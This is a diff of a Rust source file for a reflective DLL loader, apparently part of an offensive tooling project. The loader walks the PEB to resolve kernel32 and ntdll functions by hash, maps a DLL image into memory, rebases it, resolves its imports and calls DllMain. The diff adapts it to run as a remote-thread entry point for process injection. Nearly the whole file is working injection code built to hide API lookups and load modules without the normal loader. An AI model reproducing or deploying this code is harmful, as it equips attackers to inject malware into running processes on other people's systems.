@@ -1,6 +1,6 @@
 use std::{arch::asm, ffi::{CStr}, collections::BTreeMap, mem::size_of};
 
-use winapi::{um::{winnt::{PIMAGE_DOS_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, PIMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, DLL_PROCESS_ATTACH, IMAGE_REL_BASED_HIGHLOW}}, shared::{minwindef::{HMODULE, FARPROC, LPVOID, DWORD, HINSTANCE, BOOL}, ntdef::{LPCSTR, HANDLE, PVOID, NTSTATUS}, basetsd::SIZE_T}, ctypes::c_void};
+use winapi::{um::{winnt::{PIMAGE_DOS_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, PIMAGE_EXPORT_DIRECTORY, PIMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_IMPORT, PIMAGE_IMPORT_DESCRIPTOR, PIMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, PIMAGE_BASE_RELOCATION, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, DLL_PROCESS_ATTACH, IMAGE_REL_BASED_HIGHLOW, IMAGE_DOS_SIGNATURE, IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE}}, shared::{minwindef::{HMODULE, FARPROC, LPVOID, DWORD, HINSTANCE, BOOL}, ntdef::{LPCSTR, HANDLE, PVOID, NTSTATUS}, basetsd::SIZE_T}, ctypes::c_void};
 use ntapi::{ntpebteb::PTEB, ntldr::{PLDR_DATA_TABLE_ENTRY}, ntpsapi::PEB_LDR_DATA};
 use wchar::wch;
 
@@ -45,8 +45,8 @@ type fnDllMain = unsafe extern "system" fn(
 
 
 // Hash
-const KERNEL32DLL_HASH: u32 = fnv1a_hash_32_wstr(wch!("kernel32.dll"));
-const NTDLLDLL_HASH: u32 = fnv1a_hash_32_wstr(wch!("ntdll.dll"));
+static mut KERNEL32DLL_HASH: u32 = fnv1a_hash_32_wstr(wch!("kernel32.dll"));
+static mut NTDLLDLL_HASH: u32 = fnv1a_hash_32_wstr(wch!("ntdll.dll"));
 
 const LOADLIBRARYA_HASH: u32 = fnv1a_hash_32("LoadLibraryA".as_bytes());
 const GETPROCADDRESS_HASH: u32 = fnv1a_hash_32("GetProcAddress".as_bytes());
@@ -60,9 +60,55 @@ static mut VIRTUAL_ALLOC: Option<fnVirtualAlloc> = None;
 static mut NT_FLUSH_INSTRUCTION_CACHE: Option<fnNtFlushInstructionCache> = None;
 
 /// Performs a Reflective DLL Injection
-pub fn reflective_loader(dll_bytes: &'static [u8]) {
+#[no_mangle]
+pub extern "system" fn reflective_loader(create_remote_thread_parameter: *mut c_void) {
 
-    let module_base = dll_bytes.as_ptr() as usize;
+    println!("DEBUG1");
+    // STEP 0: calculate our images current base address
+
+    /*
+    // we will start searching backwards from our callers return address.
+	let rip: usize;
+
+    unsafe {
+        #[cfg(target_arch = "x86")]
+        asm!("lea {eip}, [eip]", rip = out(reg) rip);
+
+        #[cfg(target_arch = "x86_64")]
+		asm!("lea {rip}, [rip]", rip = out(reg) rip);
+	};
+
+    let mut ret_address = rip & !0xfff;
+
+    // loop through memory backwards searching for our images base address
+    loop {
+        if unsafe { (*(ret_address as PIMAGE_DOS_HEADER)).e_magic == IMAGE_DOS_SIGNATURE } {
+            let mut current_nt_header = unsafe { (*(ret_address as PIMAGE_DOS_HEADER)).e_lfanew } as usize;
+            // some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
+			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
+            if current_nt_header >= size_of::<IMAGE_DOS_HEADER>() && current_nt_header < 1024 {
+
+                current_nt_header += ret_address;
+
+                #[cfg(target_arch = "x86")]
+                let validate_signature = unsafe { (*(current_nt_header as PIMAGE_NT_HEADERS32)).Signature };
+
+                #[cfg(target_arch = "x86_64")]
+                let validate_signature = unsafe { (*(current_nt_header as PIMAGE_NT_HEADERS64)).Signature };
+
+                // break if we have found a valid MZ/PE header
+                if validate_signature == IMAGE_NT_SIGNATURE {
+                    break;
+                }
+            }
+        }
+        ret_address -= 1;
+    }
+
+    // Module base address is found
+    let module_base = ret_address as usize;
+    */
+    let module_base = create_remote_thread_parameter as usize;
 
     let dos_header = module_base as PIMAGE_DOS_HEADER;
     log::info!("[+] IMAGE_DOS_HEADER: {:?}", dos_header);
@@ -75,15 +121,21 @@ pub fn reflective_loader(dll_bytes: &'static [u8]) {
 
     let peb_ldr = get_peb_ldr() as *mut PEB_LDR_DATA;
     //log::info!("[+] PEB_LDR_DATA {:?}", peb_ldr);
+    println!("DEBUG2");
 
     //LOAD_LIBRARY_A, GET_PROC_ADDRESS, VIRTUAL_ALLOC, NT_FLUSH_INSTRUCTION_CACHE
     set_exported_functions_by_hash(peb_ldr);
-    
+    println!("DEBUG3");
+
     log::info!("[+] Copying Sections");
     let new_module_base = unsafe { copy_sections_to_local_process(module_base) };
     log::info!("[+] New Module Base: {:?}", new_module_base);
     
+    println!("DEBUG4");
+
     unsafe { copy_headers(module_base as _, new_module_base) };
+    println!("DEBUG5");
+
 
     // STEP 3: process all of our images relocations...
     log::info!("[+] Rebasing Image");
@@ -105,8 +157,6 @@ pub fn reflective_loader(dll_bytes: &'static [u8]) {
     #[allow(non_snake_case)]
     let DllMain = unsafe { std::mem::transmute::<_, fnDllMain>(entry_point) };
 
-    pause();
-
     // STEP 6: The DLLMain function to be executed
     unsafe { DllMain(std::ptr::null_mut(), DLL_PROCESS_ATTACH, std::ptr::null_mut()) };
 
@@ -116,6 +166,7 @@ pub fn reflective_loader(dll_bytes: &'static [u8]) {
 
 
 /// Rebase the image / perform image base relocation
+#[no_mangle]
 unsafe fn rebase_image(module_base: usize, new_module_base: *mut c_void) {
 
     let dos_header = module_base as PIMAGE_DOS_HEADER;
@@ -181,6 +232,7 @@ unsafe fn rebase_image(module_base: usize, new_module_base: *mut c_void) {
 }
 
 /// Resolve the image imports
+#[no_mangle]
 unsafe fn resolve_imports(new_module_base: *mut c_void) {
     let dos_header = new_module_base as PIMAGE_DOS_HEADER;
 
@@ -268,6 +320,7 @@ unsafe fn resolve_imports(new_module_base: *mut c_void) {
 }
 
 /// Copy headers into the target memory location
+#[no_mangle]
 unsafe fn copy_headers(module_base: *const u8, new_module_base: *mut c_void) {
     let dos_header = module_base as PIMAGE_DOS_HEADER;
 
@@ -283,6 +336,7 @@ unsafe fn copy_headers(module_base: *const u8, new_module_base: *mut c_void) {
 }
 
 // Copy sections of the dll to a memory location
+#[no_mangle]
 unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void { //Vec<u8>
     
     let dos_header = module_base as PIMAGE_DOS_HEADER;
@@ -316,7 +370,7 @@ unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void { //
         // get the pointer to current section header's virtual address
         //let destination = image.as_mut_ptr().add(section_header_i.VirtualAddress as usize);
         let destination = new_module_base.cast::<u8>().add(section_header_i.VirtualAddress as usize);
-        //log::info!("[+] destination: {:?}", destination);
+        //log::info!("[+] destination: {:?}", de    stination);
         
         // get a pointer to the current section header's data
         let source = module_base as usize + section_header_i.PointerToRawData as usize;
@@ -334,10 +388,10 @@ unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void { //
         )
     }
 
-    pause();
     new_module_base
 }
 
+#[no_mangle]
 fn get_peb_ldr() -> usize {
     let teb: PTEB;
 	unsafe {
@@ -356,6 +410,7 @@ fn get_peb_ldr() -> usize {
 }
 
 /// Gets the modules and module exports by hash and saves their addresses
+#[no_mangle]
 pub fn set_exported_functions_by_hash(peb_ldr: *mut PEB_LDR_DATA) {
     // get kernel32 base address via hash
     let kernel32_base = unsafe { get_loaded_module_by_hash(peb_ldr, KERNEL32DLL_HASH).expect("failed to kernel32 by hash") };
@@ -386,6 +441,7 @@ pub fn set_exported_functions_by_hash(peb_ldr: *mut PEB_LDR_DATA) {
 }
 
 /// Gets exports by hash
+#[no_mangle]
 fn get_exports_by_hash(module_base: *mut u8, hash: u32) -> Option<*mut u8> {
 
     // loop through the module exports to find export by hash
@@ -399,6 +455,7 @@ fn get_exports_by_hash(module_base: *mut u8, hash: u32) -> Option<*mut u8> {
 }
 
 /// Retrieves all function and addresses from the specfied modules
+#[no_mangle]
 unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
     let mut exports = BTreeMap::new();
     
@@ -454,6 +511,7 @@ unsafe fn get_module_exports(module_base: *mut u8) -> BTreeMap<String, usize> {
 }
 
 /// Gets loaded modules by unique hash
+#[no_mangle]
 pub unsafe fn get_loaded_module_by_hash(ldr: *mut PEB_LDR_DATA, hash: u32) -> Option<*mut u8> {
 	let mut ldr_data_ptr = (*ldr).InLoadOrderModuleList.Flink as PLDR_DATA_TABLE_ENTRY;
 	
@@ -517,6 +575,7 @@ unsafe fn rva_to_file_offset_pointer(module_base: usize, mut rva: u32) -> usize 
 */
 
 //https://github.com/Ben-Lichtman/reloader/blob/7d4e82b64f0ee6bf56dec47153721f62e207faa7/src/helpers.rs#L18
+#[no_mangle]
 pub const fn fnv1a_hash_32_wstr(wchars: &[u16]) -> u32 {
 	const FNV_OFFSET_BASIS_32: u32 = 0x811c9dc5;
 	const FNV_PRIME_32: u32 = 0x01000193;
@@ -534,6 +593,7 @@ pub const fn fnv1a_hash_32_wstr(wchars: &[u16]) -> u32 {
 }
 
 //https://github.com/Ben-Lichtman/reloader/blob/7d4e82b64f0ee6bf56dec47153721f62e207faa7/src/helpers.rs#L34
+#[no_mangle]
 pub const fn fnv1a_hash_32(chars: &[u8]) -> u32 {
 	const FNV_OFFSET_BASIS_32: u32 = 0x811c9dc5;
 	const FNV_PRIME_32: u32 = 0x01000193;
@@ -548,17 +608,4 @@ pub const fn fnv1a_hash_32(chars: &[u8]) -> u32 {
 		i += 1;
 	}
 	hash
-}
-
-fn get_input() -> std::io::Result<()> {
-    let mut buf = String::new();
-    std::io::stdin().read_line(&mut buf)?;
-    Ok(())
-}
-/// Used for debugging
-fn pause() {
-    match get_input() {
-        Ok(buffer) => println!("{:?}", buffer),
-        Err(error) => println!("error: {}", error),
-    };
 }
